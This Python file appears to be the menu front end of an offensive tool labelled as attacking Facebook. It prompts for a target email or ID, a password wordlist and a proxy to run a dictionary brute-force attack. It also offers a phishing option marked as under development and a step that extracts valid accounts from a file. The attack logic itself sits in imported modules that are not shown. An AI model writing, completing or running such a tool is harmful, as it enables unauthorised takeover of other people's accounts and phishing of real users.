from libraries import *
import http.client as httplib
from bruteforce import FaceBoom
from bruteforce import Main
from fish import site_facebook
from checkValidPass import extractValidAccounts


def main():
    clear()
    banner_small()
    print(f'\t{RED}[+]{ORANGE} Chose {BLUE}Any Option{ORANGE} From Below To Attack {GREEN}Facebook')
    print(f'\t{ORANGE} [{CYAN}01{ORANGE}] {WHITE} Distionary ')
    print(f"\t{ORANGE} [{MAGENTA}02{ORANGE}] {BLUE} Phishing [Under Dev] ")
    print(f'\t{ORANGE} [{WHITE}03{ORANGE}] {GREEN} Extract Valid Accounts')
    print(f'\t{ORANGE} [{RED}00{ORANGE}] {MAGENTA} Exit\n')

    check = input(f'\t {WHITEBG}{BLACK}[+]{MAGENTA}{BLACKBG}\t')
    if check == '1' or check == '01':
        time.sleep(2)
        clear()
        banner_small()
        target = input(RED + "[*] " + BLUE + "Enter Target Email or ID: " + WHITE)
        wordlist = input(RED + "[+] " + BLUE + "Enter wordlist File: " + WHITE)
        single_passwd = input(RED + "[+] " + BLUE + "Enter Single Passwored (press Enter if none): " + WHITE)
        proxy = input(RED + '[+] ' + BLUE + "Enter HTTP/S Proxy to be used (press Enter if none): " + WHITE)

        # If the user chooses 1, perform bruteforce
        Main(target,wordlist,single_passwd,proxy)
    elif check == '2' or check == '02':
        site_facebook()
    elif check == '3' or check=='03':
        time.sleep(1)
        clear()
        banner_small()
        target = input(RED + "[*] " + BLUE + "Enter File Path You Want To Scan : " + WHITE)
        extractValidAccounts(target)
    elif check == '0' or check=='00':
        msg_exit()
    else:
        print(f'\t{RED} [!] {GREEN} You Entered Wrong Command. {ORANGE}Try Again ')
        time.sleep(2)
        main()
